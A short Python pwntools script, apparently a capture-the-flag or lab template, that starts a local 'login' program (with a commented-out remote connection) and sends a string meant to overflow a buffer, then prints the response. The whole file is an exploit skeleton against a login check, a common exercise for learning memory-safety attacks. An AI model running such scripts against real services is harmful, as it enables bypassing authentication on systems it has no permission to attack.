from pwn import *

# Start program
io = process('./login')
# connecting to a server
# io = remote ('{server}','{port}')

# Send string to overflow buffer
io.sendlineafter(b':', b'AAAAAAA')

# Receive output and print it out to us...
print(io.recvall().decode())
